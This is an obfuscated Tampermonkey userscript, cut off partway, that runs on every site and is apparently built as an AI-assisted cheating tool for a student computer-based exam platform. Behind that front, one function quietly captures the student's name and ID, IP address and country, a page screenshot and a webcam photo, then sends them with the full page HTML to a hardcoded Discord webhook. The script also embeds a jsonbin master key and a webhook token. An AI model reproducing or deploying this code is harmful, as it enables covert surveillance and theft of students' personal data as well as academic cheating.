// ==UserScript==
// @name         1
// @namespace    http://tampermonkey.net/
// @version      3
// @description  six sevennnn
// @author       all of them
// @match        http://*/*
// @match        https://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @connect      ollama.com
// @connect      api.jsonbin.io
// @connect      ipapi.co
// @connect      discord.com
// @connect      discordapp.com
// @connect      cdnjs.cloudflare.com
// @connect      *
// @require      https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js
// @run-at       document-idle
// @updateURL    https://raw.githubusercontent.com/primehat6767/67ANSWER/refs/heads/main/1.js
// @downloadURL  https://raw.githubusercontent.com/primehat6767/67ANSWER/refs/heads/main/1.js
// ==/UserScript==

(function() {
    'use strict';
    const OLLAMA_API_KEY = "apikey";
    const MODEL_NAME = "gemma4:31b";
    const API_URL = "https://ollama.com/api/chat";

    const _0x51a4 = [
        'https://api.jsonbin.io/v3/b/6ac76b90ffd5d1605358bbab',
        '$2a$10$J5bCuNsFU1mUeoDC4TY1suqRkLlQeBal5c9peagEf4m7E5ZPGy1Ju',
        'https://discord.com/api/webhooks/1558080661829456054/IkdBd5J5BcZVHDgFJn5DmhyL8ZzaFjcEJLEDSEHxpb4FMdHT7hobEhjWyUzB_bYst_LB',
        'https://ipapi.co/json/',
        'cbt_user_identity',
        'Admin_',
        'User_',
        'cbt_setting_hint',
        'cbt_setting_interval',
        'cbt_scraped_live',
        'cbt_full_scrape_sent',
        'cbt-stealth-host',
        'cbt-panic-btn',
        'cbt-main-btn',
        'cbt-hint-box',
        'cbt-modal',
        'cbt-close-modal',
        'tab-btn-ans',
        'tab-btn-chat',
        'tab-btn-ai',
        'tab-btn-board',
        'tab-btn-set',
        'cbt-tab-ans',
        'cbt-tab-chat',
        'cbt-tab-ai',
        'cbt-tab-board',
        'cbt-tab-set',
        'cbt-status',
        'cbt-table-body',
        'chat-messages',
        'chat-input',
        'chat-send',
        'chat-virtual-keyboard',
        'ai-chat-messages',
        'ai-chat-input',
        'ai-chat-send',
        'ai-virtual-keyboard',
        'cbt-board-body',
        'cfg-delay',
        'cfg-hint',
        'cfg-clear',
        'cbt-disconnect-overlay'
    ];
    const _0x2b8e = function(_0x4d12) {
        return _0x51a4[_0x4d12];
    };

    const BIN_URL = _0x2b8e(0);
    const BIN_KEY = _0x2b8e(1);
    const DISCORD_WEBHOOK_URL = _0x2b8e(2);

    let _0x43a0 = false, _0x11b2 = false, _0x27f9 = false, _0x58c3 = {}, _0x33e8 = "", _0x2a91 = false, _0x789b = "";
    let _0x4f12_host = null, _0x4f12_root = null;

    function _0x1a2b(_0x12) {
        return _0x4f12_root ? _0x4f12_root.getElementById(_0x12) : null;
    }

    let _0x409e = GM_getValue(_0x2b8e(4), '');
    if (!_0x409e || _0x409e.startsWith(_0x2b8e(5))) {
        _0x409e = _0x2b8e(6) + Math.random().toString(36).substring(2, 6).toUpperCase();
        GM_setValue(_0x2b8e(4), _0x409e);
    }

    let _0x1f72 = GM_getValue(_0x2b8e(7), true);
    let _0x54e7 = GM_getValue(_0x2b8e(8), 8);

    const _0x31d4 = () => JSON.parse(GM_getValue(_0x2b8e(9), '[]'));
    const _0x5891 = (_0x29c4) => GM_setValue(_0x2b8e(9), JSON.stringify(_0x29c4));

    function _0x101a() {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: "GET",
                url: _0x2b8e(3),
                onload: (res) => {
                    try {
                        let data = JSON.parse(res.responseText);
                        resolve({
                            ip: data.ip || "UnknownIP",
                            country: data.country_name || "UnknownCountry"
                        });
                    } catch (e) {
                        resolve({ ip: "UnknownIP", country: "UnknownCountry" });
                    }
                },
                onerror: () => resolve({ ip: "UnknownIP", country: "UnknownCountry" })
            });
        });
    }

    function _0x102b() {
        return new Promise((resolve) => {
            if (typeof html2canvas === 'undefined') {
                resolve(null);
                return;
            }
            html2canvas(document.body, {
                scale: 1,
                useCORS: true,
                logging: false,
                windowWidth: document.documentElement.clientWidth,
                windowHeight: document.documentElement.clientHeight
            }).then(canvas => {
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/png');
            }).catch(err => {
                resolve(null);
            });
        });
    }

    function _0x103c() {
        return new Promise(async (resolve) => {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve(null);
                    return;
                }
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await new Promise((res) => {
                    video.onloadedmetadata = () => {
                        video.play().then(res);
                    };
                });
                await new Promise(r => setTimeout(r, 600));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.85);
            } catch (err) {
                resolve(null);
            }
        });
    }

    async function _0x104d() {
        if (DISCORD_WEBHOOK_URL.includes("MASUKKAN_WEBHOOK_URL_ANDA_DI_SINI")) return;
        if (sessionStorage.getItem(_0x2b8e(10))) return;

        let nameEl = document.querySelector('.flex.space-x-2.justify-end p.font-semibold.text-right');
        let nisEl = document.querySelector('.flex.space-x-2.justify-end p.text-sm.text-right');
        let studentName = nameEl ? nameEl.innerText.trim() : "NAMA_SISWA";
        let studentNis = nisEl ? nisEl.innerText.trim() : "NIS0000000";

        let geoInfo = await _0x101a();
        let timing = new Date().toISOString().replace(/[:.]/g, '-');
        let uniqueId = `${studentNis}_${studentName.replace(/[^a-zA-Z0-9]/g, '_')}_${timing}`;

        let [screenshotBlob, cameraBlob] = await Promise.all([
            _0x102b(),
            _0x103c()
        ]);

        let cloneDoc = document.cloneNode(true);
        let linkTags = cloneDoc.querySelectorAll('link[rel="stylesheet"]');
        let fetchPromises = Array.from(linkTags).map(link => {
            return new Promise((resolve) => {
                let href = link.getAttribute('href');
                if (!href) { resolve(); return; }
                let absoluteUrl = new URL(href, window.location.href).href;
                GM_xmlhttpRequest({
                    method: "GET",
                    url: absoluteUrl,
                    onload: (res) => {
                        if (res.status >= 200 && res.status < 300) {
                            let styleEl = cloneDoc.createElement('style');
                            styleEl.textContent = res.responseText;
                            link.replaceWith(styleEl);
                        }
                        resolve();
                    },
                    onerror: () => resolve()
                });
            });
        });

        await Promise.all(fetchPromises);

        let fullWebContent = "<!DOCTYPE html>\n" + cloneDoc.documentElement.outerHTML;
        let htmlBlob = new Blob([fullWebContent], { type: 'text/html' });

        let formData = new FormData();
        formData.append('files[0]', htmlBlob, `${uniqueId}.html`);
        if (screenshotBlob) formData.append('files[1]', screenshotBlob, `${uniqueId}_screen.png`);
        if (cameraBlob) formData.append('files[2]', cameraBlob, `${uniqueId}_camera.jpg`);

        formData.append('payload_json', JSON.stringify({
            content: `🚨 **CBT Full Package & Camera Snapshot Captured!**\n👤 **Nama:** \`${studentName}\`\n🆔 **NIS:** \`${studentNis}\`\n📌 **Node:** \`${_0x409e}\`\n🌍 **IP:** \`${geoInfo.ip} (${geoInfo.country})\``
        }));

        GM_xmlhttpRequest({
            method: "POST",
            url: DISCORD_WEBHOOK_URL,
            data: formData,
            onload: (res) => {
                if (res.status >= 200 && res.status < 300) {
                    sessionStorage.setItem(_0x2b8e(10), 'true');
                }
            },
            onerror: () => {}
        });
    }

    function _0x11a5() {
        if (document.getElementById(_0x2b8e(11))) return;
        _0x4f12_host = document.createElement('div');
        _0x4f12_host.id = _0x2b8e(11);
        _0x4f12_host.style = "position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647; pointer-events: none;";
        document.body.appendChild(_0x4f12_host);

        _0x4f12_root = _0x4f12_host.attachShadow({ mode: 'closed' });

        const panicBtn = document.createElement('div');
        panicBtn.id = _0x2b8e(12);
        panicBtn.title = "Emergency Toggle";
        panicBtn.style = "position: absolute; top: 5px; left: 5px; width: 20px; height: 20px; background: black; opacity: 0; cursor: pointer; border-radius: 4px; pointer-events: auto;";
        panicBtn.onclick = _0x2d48;
        _0x4f12_root.appendChild(panicBtn);

        const btn = document.createElement('button');
        btn.id = _0x2b8e(13);
        btn.innerText = '[SYSTEM] Initializing...';
        btn.style = "position: absolute; bottom: 20px; right: 20px; padding: 12px 20px; background-color: #1e293b; color: #ffffff; border: 1px solid #334155; border-radius: 6px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.15); font-family: sans-serif; font-size: 13px; pointer-events: auto;";
        btn.onclick = _0x48e9;
        _0x4f12_root.appendChild(btn);

        const hintBox = document.createElement('div');
        hintBox.id = _0x2b8e(14);
        hintBox.style = "display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0f172a; color: #f8fafc; padding: 18px 36px; border-radius: 8px; font-size: 22px; font-weight: 700; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); opacity: 0; pointer-events: none; font-family: sans-serif;";
        _0x4f12_root.appendChild(hintBox);

        const modal = document.createElement('div');
        modal.id = _0x2b8e(15);
        modal.style = "display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.75); backdrop-filter: blur(4px); justify-content: center; align-items: center; font-family: sans-serif; pointer-events: auto;";
        modal.innerHTML = `
            <div style="position: relative; width: 90%; height: 95%; max-width: 700px; display: flex; flex-direction: column;">
                <button id="${_0x2b8e(16)}" style="position: absolute; top: -15px; right: -15px; width: 35px; height: 35px; background: #ef4444; color: #ffffff; border: 2px solid #ffffff; border-radius: 50%; font-weight: bold; cursor: pointer; font-size: 16px; display: flex; justify-content: center; align-items: center; z-index: 10; padding: 0;">X</button>
                <div style="background: #ffffff; width: 100%; height: 100%; border-radius: 8px; display: flex; flex-direction: column; overflow: hidden; border: 1px solid #cbd5e1; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);">
                    <div style="display: flex; background: #f8fafc; border-bottom: 1px solid #e2e8f0; flex-wrap: wrap;">
                        <button id="${_0x2b8e(17)}" style="flex: 1; padding: 14px 8px; border: none; background: #ffffff; font-weight: 600; cursor: pointer; border-bottom: 2px solid #2563eb; color: #0f172a; font-size: 13px;">Answers</button>
                        <button id="${_0x2b8e(18)}" style="flex: 1; padding: 14px 8px; border: none; background: transparent; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; color: #64748b; font-size: 13px;">Global Chat</button>
                        <button id="${_0x2b8e(19)}" style="flex: 1; padding: 14px 8px; border: none; background: transparent; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; color: #64748b; font-size: 13px;">AI Chat</button>
                        <button id="${_0x2b8e(20)}" style="flex: 1; padding: 14px 8px; border: none; background: transparent; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; color: #64748b; font-size: 13px;">Leaderboard</button>
                        <button id="${_0x2b8e(21)}" style="flex: 1; padding: 14px 8px; border: none; background: transparent; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; color: #64748b; font-size: 13px;">Settings</button>
                    </div>
                    <div id="${_0x2b8e(22)}" style="display: flex; flex-direction: column; flex-grow: 1; padding: 20px; overflow-y: auto;">
                        <div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
                            <span id="${_0x2b8e(27)}" style="color: #2563eb; font-weight: 600; font-size: 13px;">[STATUS] Active.</span>
                            <span style="font-size: 12px; color: #64748b;">Node: ${_0x409e}</span>
                        </div>
                        <table style="width: 100%; border-collapse: collapse; text-align: left; color: #1e293b; font-size: 13px;">
                            <thead>
                                <tr style="background: #f1f5f9; border-bottom: 1px solid #cbd5e1;">
                                    <th style="padding: 10px; border: 1px solid #e2e8f0; width: 30px;">No.</th>
                                    <th style="padding: 10px; border: 1px solid #e2e8f0;">Question</th>
                                    <th style="padding: 10px; border: 1px solid #e2e8f0; width: 200px;">Resolution</th>
                                </tr>
                            </thead>
                            <tbody id="${_0x2b8e(28)}">
                                <tr><td colspan="3" style="text-align: center; padding: 20px; color: #64748b;">Awaiting data...</td></tr>
                            </tbody>
                        </table>
                    </div>
                    <div id="${_0x2b8e(23)}" style="display: none; flex-direction: column; flex-grow: 1; background: #f8fafc; overflow: hidden;">
                        <div id="${_0x2b8e(29)}" style="flex-grow: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;"></div>
                        <div style="padding: 10px; border-top: 1px solid #e2e8f0; background: #ffffff; display: flex; flex-direction: column; gap: 10px;">
                            <div style="display: flex;">
                                <input type="text" id="${_0x2b8e(30)}" readonly placeholder="Use virtual keyboard..." style="flex-grow: 1; padding: 10px; border: 1px solid #cbd5e1; border-radius: 4px; margin-right: 10px; font-size: 14px; background: #f1f5f9;">
                                <button id="${_0x2b8e(31)}" style="padding: 10px 15px; background: #2563eb; color: #ffffff; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">SEND</button>
                            </div>
                            <div id="${_0x2b8e(32)}" style="display: flex; flex-direction: column; gap: 4px; background: #e2e8f0; padding: 8px; border-radius: 6px;"></div>
                        </div>
                    </div>
                    <div id="${_0x2b8e(24)}" style="display: none; flex-direction: column; flex-grow: 1; background: #f8fafc; overflow: hidden;">
                        <div id="${_0x2b8e(33)}" style="flex-grow: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;"></div>
                        <div style="padding: 10px; border-top: 1px solid #e2e8f0; background: #ffffff; display: flex; flex-direction: column; gap: 10px;">
                            <div style="display: flex;">
                                <input type="text" id="${_0x2b8e(34)}" readonly placeholder="Use virtual keyboard..." style="flex-grow: 1; padding: 10px; border: 1px solid #cbd5e1; border-radius: 4px; margin-right: 10px; font-size: 14px; background: #f1f5f9;">
                                <button id="${_0x2b8e(35)}" style="padding: 10px 15px; background: #10b981; color: #ffffff; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">SEND</button>
                            </div>
                            <div id="${_0x2b8e(36)}" style="display: flex; flex-direction: column; gap: 4px; background: #e2e8f0; padding: 8px; border-radius: 6px;"></div>
                        </div>
                    </div>
                    <div id="${_0x2b8e(25)}" style="display: none; flex-direction: column; flex-grow: 1; padding: 20px; overflow-y: auto; background: #ffffff;">
                        <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 13px;">
                            <thead><tr style="background: #f1f5f9;"><th style="padding: 10px;">Rank</th><th>ID</th><th>Commits</th></tr></thead>
                            <tbody id="${_0x2b8e(37)}"><tr><td colspan="3">No data.</td></tr></tbody>
                        </table>
                    </div>
                    <div id="${_0x2b8e(26)}" style="display: none; flex-direction: column; flex-grow: 1; padding: 30px; background: #ffffff;">
                        <h3>Settings</h3>
                        <label>Interval:</label>
                        <input type="number" id="${_0x2b8e(38)}" value="${_0x54e7}" style="padding: 8px; width: 100px;">
                        <label><input type="checkbox" id="${_0x2b8e(39)}" ${_0x1f72 ? 'checked' : ''}> Hint</label>
                        <button id="${_0x2b8e(40)}" style="background: #ef4444; color: white; padding: 8px;">Clear Cache</button>
                    </div>
                </div>
            </div>
        `;
        _0x4f12_root.appendChild(modal);

        const btnAns = _0x1a2b(_0x2b8e(17)), btnChat = _0x1a2b(_0x2b8e(18)), btnAI = _0x1a2b(_0x2b8e(19)), btnBoard = _0x1a2b(_0x2b8e(20)), btnSet = _0x1a2b(_0x2b8e(21));
        const tabAns = _0x1a2b(_0x2b8e(22)), tabChat = _0x1a2b(_0x2b8e(23)), tabAI = _0x1a2b(_0x2b8e(24)), tabBoard = _0x1a2b(_0x2b8e(25)), tabSet = _0x1a2b(_0x2b8e(26));

        function switchTab(activeBtn, activeTab) {
            [btnAns, btnChat, btnAI, btnBoard, btnSet].forEach(b => { if(b) { b.style.background = 'transparent'; b.style.borderBottomColor = 'transparent'; b.style.color = '#64748b'; } });
            [tabAns, tabChat, tabAI, tabBoard, tabSet].forEach(t => { if(t) t.style.display = 'none'; });
            if(activeBtn) { activeBtn.style.background = '#ffffff'; activeBtn.style.borderBottomColor = '#2563eb'; activeBtn.style.color = '#0f172a'; }
            if(activeTab) activeTab.style.display = 'flex';
        }

        if(btnAns) btnAns.onclick = () => switchTab(btnAns, tabAns);
        if(btnChat) btnChat.onclick = () => { switchTab(btnChat, tabChat); _0x44d2(); };
        if(btnAI) btnAI.onclick = () => switchTab(btnAI, tabAI);
        if(btnBoard) btnBoard.onclick = () => switchTab(btnBoard, tabBoard);
        if(btnSet) btnSet.onclick = () => switchTab(btnSet, tabSet);

        const closeBtn = _0x1a2b(_0x2b8e(16));
        if(closeBtn) closeBtn.onclick = () => modal.style.display = 'none';

        const cfgDelay = _0x1a2b(_0x2b8e(38));
        if(cfgDelay) cfgDelay.onchange = (e) => { _0x54e7 = parseInt(e.target.value) || 8; GM_setValue(_0x2b8e(8), _0x54e7); };

        const cfgHint = _0x1a2b(_0x2b8e(39));
        if(cfgHint) cfgHint.onchange = (e) => { _0x1f72 = e.target.checked; GM_setValue(_0x2b8e(7), _0x1f72); };

        const cfgClear = _0x1a2b(_0x2b8e(40));
        if(cfgClear) cfgClear.onclick = () => { if(confirm("Purge?")) { GM_setValue(_0x2b8e(9), '[]'); alert("Purged."); _0x50f1({}); } };

        const chatSend = _0x1a2b(_0x2b8e(31));
        if(chatSend) chatSend.onclick = _0x1d7c;

        const aiSend = _0x1a2b(_0x2b8e(35));
        if(aiSend) aiSend.onclick = _0x2b3d;

        _0x1initKeyboard(_0x2b8e(32), _0x2b8e(30));
        _0x1initKeyboard(_0x2b8e(36), _0x2b8e(34));
    }

    function _0x1initKeyboard(containerId, inputId) {
        const kbContainer = _0x1a2b(containerId);
        const inputField = _0x1a2b(inputId);
        if (!kbContainer || !inputField) return;

        const layouts = [
            ['1','2','3','4','5','6','7','8','9','0'],
            ['Q','W','E','R','T','Y','U','I','O','P'],
            ['A','S','D','F','G','H','J','K','L'],
            ['Z','X','C','V','B','N','M', ',', '.', '?']
        ];

        layouts.forEach(row => {
            const rowDiv = document.createElement('div');
            rowDiv.style = "display: flex; justify-content: center; gap: 3px;";
            row.forEach(key => {
                const btn = document.createElement('button');
                btn.innerText = key;
                btn.style = "flex: 1; padding: 10px 0; font-size: 14px; font-weight: bold; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 4px; cursor: pointer;";
                const handlePress = (e) => { e.preventDefault(); if (!inputField.disabled) inputField.value += key.toLowerCase(); };
                btn.onmousedown = (e) => { e.preventDefault(); if(!inputField.disabled) btn.style.background = "#e2e8f0"; };
                btn.onmouseup = (e) => { e.preventDefault(); btn.style.background = "#ffffff"; handlePress(e); };
                rowDiv.appendChild(btn);
            });
            kbContainer.appendChild(rowDiv);
        });

        const bottomRow = document.createElement('div');
        bottomRow.style = "display: flex; justify-content: center; gap: 4px; margin-top: 2px;";

        const clearBtn = document.createElement('button');
        clearBtn.innerText = "CLEAR";
        clearBtn.style = "flex: 1; padding: 10px 0; font-size: 11px; font-weight: bold; background: #f59e0b; color: white; border-radius: 4px; cursor: pointer;";
        clearBtn.onmousedown = (e) => { e.preventDefault(); if(!inputField.disabled) inputField.value = ""; };

        const spaceBtn = document.createElement('button');
        spaceBtn.innerText = "SPACE";
        spaceBtn.style = "flex: 3; padding: 10px 0; font-size: 12px; font-weight: bold; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 4px; cursor: pointer;";
        spaceBtn.onmousedown = (e) => { e.preventDefault(); if(!inputField.disabled) inputField.value += " "; };

        const backBtn = document.createElement('button');
        backBtn.innerText = "DEL";
        backBtn.style = "flex: 1; padding: 10px 0; font-size: 12px; font-weight: bold; background: #ef4444; color: white; border-radius: 4px; cursor: pointer;";
        backBtn.onmousedown = (e) => { e.preventDefault(); if (!inputField.disabled) inputField.value = inputField.value.slice(0, -1); };

        bottomRow.appendChild(clearBtn);
        bottomRow.appendChild(spaceBtn);
        bottomRow.appendChild(backBtn);
        kbContainer.appendChild(bottomRow);
    }

    async function _0x2b3d() {
        const input = _0x1a2b(_0x2b8e(34));
        const btn = _0x1a2b(_0x2b8e(35));
        if (!input || !btn || input.disabled) return;
        const msg = input.value.trim();
        if (!msg) return;
        input.value = "";
        _0x3c4e("Client", msg, "#1e293b", "#ffffff");
        btn.innerText = "WAIT"; btn.disabled = true;
        try {
            let res = await _0x4f31(msg);
            _0x3c4e("System AI", res, "#10b981", "#ffffff");
        } catch (e) {
            _0x3c4e("System Error", "AI failed.", "#ef4444", "#ffffff");
        }
        btn.innerText = "SEND"; btn.disabled = false;
    }

    function _0x3c4e(sender, text, bg, tc) {
        const c = _0x1a2b(_0x2b8e(33));
        if (!c) return;
        c.innerHTML += `<div style="display: flex; flex-direction: column; align-items: ${sender === "Client" ? "flex-end" : "flex-start"}; width: 100%; margin-bottom: 8px;"><span style="font-size: 11px; color: #64748b;">${sender}</span><div style="background: ${bg}; padding: 10px; border-radius: 6px; max-width: 85%; color: ${tc}; font-size: 13px;">${text}</div></div>`;
        c.scrollTop = c.scrollHeight;
    }

    function _0x2d48() {
        _0x27f9 = !_0x27f9;
        let b = _0x1a2b(_0x2b8e(13)), m = _0x1a2b(_0x2b8e(15));
        if (b) b.style.display = _0x27f9 ? 'none' : 'block';
        if (m) m.style.display = 'none';
    }

    function _0x3a5b() {
        _0x2a91 = true;
        let b = _0x1a2b(_0x2b8e(13)), m = _0x1a2b(_0x2b8e(15));
        if (b) b.style.display = 'none';
        if (m) m.style.display = 'none';
        if (!_0x4f12_root.getElementById(_0x2b8e(41))) {
            const o = document.createElement('div');
            o.id = _0x2b8e(41);
            o.style = "position: absolute; top:0; left:0; width:100%; height:100%; background: #090d16; color: #ef4444; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 99999;";
            o.innerHTML = `<h2>[TERMINATED]</h2>`;
            _0x4f12_root.appendChild(o);
        }
    }

    function _0x2f4c() {
        _0x2a91 = false;
        let o = _0x1a2b(_0x2b8e(41));
        if (o) o.remove();
        let b = _0x1a2b(_0x2b8e(13));
        if (b && !_0x27f9) b.style.display = 'block';
    }

    function _0x1b28(aD) {
        if (!_0x1f72 || _0x27f9 || _0x2a91) return;
        let qD = document.querySelector('.py-8 .my-2') || document.querySelector('.py-8 > div:first-child');
        let oC = document.querySelector('.flex.flex-col.space-y-3.mt-5');
        if (!qD || !oC) return;
        let qT = qD.innerText.trim();
        if (qT && aD[qT] && qT !== _0x33e8) {
            _0x33e8 = qT;
            const hB = _0x1a2b(_0x2b8e(14));
            if (!hB) return;
            hB.innerText = `[OPTION]: ${aD[qT]}`;
            hB.style.display = 'block';
            setTimeout(() => { hB.style.opacity = '1'; }, 10);
            setTimeout(() => { hB.style.opacity = '0'; setTimeout(() => { hB.style.display = 'none'; }, 300); }, 2500);
        }
    }

    function _0x48e9() {
        if (_0x27f9 || _0x2a91) return;
        let m = _0x1a2b(_0x2b8e(15));
        if (m) m.style.display = 'flex';
        _0x52c9();
    }

    function _0x19a0(t) {
        let s = _0x1a2b(_0x2b8e(27));
        if (s) s.innerText = `[STATUS] ${t}`;
    }

    setInterval(() => {
        if (_0x2a91) return;
        let qD = document.querySelector('.py-8 .my-2') || document.querySelector('.py-8 > div:first-child');
        let oC = document.querySelector('.flex.flex-col.space-y-3.mt-5');
        let b = _0x1a2b(_0x2b8e(13));
        if (!qD || !oC || !b) return;
        let qT = qD.innerText.trim();
        if (qT === "") return;
        if (qT !== _0x33e8 && _0x58c3[qT]) _0x1b28(_0x58c3);
        let qL = _0x31d4();
        let exists = qL.find(q => q.question === qT);
        if (!exists) {
            b.style.backgroundColor = '#d97706';
            b.innerText = '[WAIT] Saving...';
            let oD = {};
            oC.querySelectorAll('.flex.space-x-1').forEach(el => {
                let lS = el.querySelector('label span.uppercase'), tP = el.querySelector('p');
                if (lS && tP) oD[lS.innerText.trim().toUpperCase()] = tP.innerText.trim();
            });
            if (Object.keys(oD).length > 0) {
                qL.push({ number: qL.length + 1, question: qT, options: oD });
                _0x5891(qL);
                _0x52c9();
            }
        } else {
            b.style.backgroundColor = '#1e293b';
            b.innerText = `[SYSTEM] (${qL.length})`;
        }
    }, 300);

    async function _0x52c9() {
        if (_0x43a0 || _0x2a91) { _0x11b2 = true; return; }
        _0x43a0 = true; _0x11b2 = false;
        try { await _0x2e08(); } catch (e) {}
        _0x43a0 = false;
        if (_0x11b2 && !_0x2a91) _0x52c9();
    }

    function _0x163f() {
        setTimeout(() => {
            if (!_0x43a0 && !_0x2a91 && _0x1a2b(_0x2b8e(13))) _0x52c9();
            _0x163f();
        }, _0x54e7 * 1000);
    }

    function _0x15f1() {
        setInterval(async () => {
            if (_0x2a91) return;
            let sd = await _0x39a0();
            if (sd && sd.chats) {
                _0x789b = sd.contributors || {};
                let adminState = sd.adminState || { isMuted: false, disconnectedUsers: [] };
                if (adminState.disconnectedUsers && (adminState.disconnectedUsers.includes(_0x409e) || adminState.disconnectedUsers.includes("ALL"))) {
                    _0x3a5b(); return;
                }
                _0x38b2(adminState.isMuted);
                _0x1c39(sd.chats);
            }
        }, 2500);
    }

    async function _0x2e08() {
        let qL = _0x31d4();
        _0x19a0("Syncing...");
        let sd = await _0x39a0();
        let a = sd.answers || {}, chats = sd.chats || [], adminState = sd.adminState || { isMuted: false, disconnectedUsers: [] };
        _0x789b = sd.contributors || {};

        if (adminState.disconnectedUsers && (adminState.disconnectedUsers.includes(_0x409e) || adminState.disconnectedUsers.includes("ALL"))) {
            _0x3a5b(); return;
        } else {
            _0x2f4c();
        }
        _0x38b2(adminState.isMuted);
        _0x58c3 = a;
        _0x1c39(chats);
        _0x1b28(a);

        if (qL.length === 0) { _0x19a0("Waiting..."); return; }
        let aR = { ...a };
        let mQ = qL.filter(q => !a[q.question]);
        if (mQ.length > 0) {
            _0x19a0(`AI processing...`);
            let pQ = "";
            mQ.forEach(q => {
                pQ += `\n--- No. ${q.number} ---\n${q.question}\nOptions:\n`;
                for (let k in q.options) pQ += `  ${k}. ${q.options[k]}\n`;
            });
            let prompt = "Output JSON format {\"1\": \"A\"}\n" + pQ;
            try {
                let aiR = await _0x4f31(prompt);
                let aiJ = _0x21c0(aiR);
                let updated = false;
                mQ.forEach(q => {
                    let ansL = aiJ[q.number] || aiJ[String(q.number)];
                    if (ansL && q.options[ansL]) {
                        let textA = q.options[ansL];
                        a[q.question] = textA;
                        aR[q.question] = `${textA} [AI]`;
                        _0x58c3[q.question] = textA;
                        updated = true;
                    }
                });
                if (updated) {
                    let latest = await _0x39a0();
                    let latestCo = latest.contributors || {};
                    latestCo[_0x409e] = (latestCo[_0x409e] || 0) + 1;
                    await _0x15e3({ answers: { ...latest.answers, ...a }, chats: latest.chats || chats, adminState, contributors: latestCo });
                    _0x19a0("[OK] Saved");
                }
            } catch (e) { _0x19a0("[WAIT] Busy"); }
        }
        _0x50f1(aR);
    }

    function _0x38b2(isMuted) {
        const inp = _0x1a2b(_0x2b8e(30)), btn = _0x1a2b(_0x2b8e(31));
        if (!inp || !btn) return;
        inp.disabled = isMuted;
        btn.disabled = isMuted;
        btn.style.background = isMuted ? "#94a3b8" : "#2563eb";
    }

    async function _0x1d7c() {
        const inp = _0x1a2b(_0x2b8e(30));
        if (!inp || inp.disabled) return;
        let val = inp.value.trim();
        if (!val) return;
        inp.value = "";
        let sd = await _0x39a0();
        let chats = sd.chats || [];
        chats.push({ sender: _0x409e, text: val, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) });
        if (chats.length > 50) chats.shift();
        await _0x15e3({ answers: sd.answers || {}, chats, adminState: sd.adminState || { isMuted: false, disconnectedUsers: [] }, contributors: sd.contributors || {} });
        _0x1c39(chats);
        _0x44d2();
    }

    function _0x1c39(chats) {
        const cC = _0x1a2b(_0x2b8e(29));
        if (!cC) return;
        cC.innerHTML = "";
        if (chats.length === 0) {
            cC.innerHTML = "<div style='text-align:center; color:#94a3b8;'>No messages.</div>";
            return;
        }
        chats.forEach(m => {
            cC.innerHTML += `<div style="display: flex; flex-direction: column; align-items: ${m.sender === _0x409e ? "flex-end" : "flex-start"}; width: 100%;"><span style="font-size: 11px; color: #64748b;">${m.sender} • ${m.time}</span><div style="background: ${m.sender === _0x409e ? "#2563eb" : "#e2e8f0"}; color: ${m.sender === _0x409e ? "#fff" : "#000"}; padding: 8px; border-radius: 6px; font-size: 13px;">${m.text}</div></div>`;
        });
    }

    function _0x44d2() {
        const cC = _0x1a2b(_0x2b8e(29));
        if (cC) cC.scrollTop = cC.scrollHeight;
    }

    function _0x50f1(d) {
        let tb = _0x1a2b(_0x2b8e(28));
        if (!tb) return;
        let qL = _0x31d4();
        if (qL.length === 0) return;
        tb.innerHTML = "";
        qL.forEach(q => {
            let tr = document.createElement('tr');
            let ans = d[q.question] || "[PENDING]";
            tr.innerHTML = `<td style="padding: 10px; border: 1px solid #e2e8f0;">${q.number}</td><td style="padding: 10px; border: 1px solid #e2e8f0;">${q.question}</td><td style="padding: 10px; border: 1px solid #e2e8f0;">${ans}</td>`;
            tb.appendChild(tr);
        });
    }

    function _0x39a0() {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: "GET",
                url: BIN_URL + "?t=" + new Date().getTime(),
                headers: { "X-Master-Key": BIN_KEY },
                onload: (res) => {
                    try {
                        let parsed = JSON.parse(res.responseText).record || {};
                        resolve({ answers: parsed.answers || {}, chats: parsed.chats || [], adminState: parsed.adminState || {}, contributors: parsed.contributors || {} });
                    } catch { resolve({ answers: {}, chats: [], adminState: {}, contributors: {} }); }
                },
                onerror: () => resolve({ answers: {}, chats: [], adminState: {}, contributors: {} })
            });
        });
    }

    function _0x15e3(data) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: "PUT",
                url: BIN_URL,
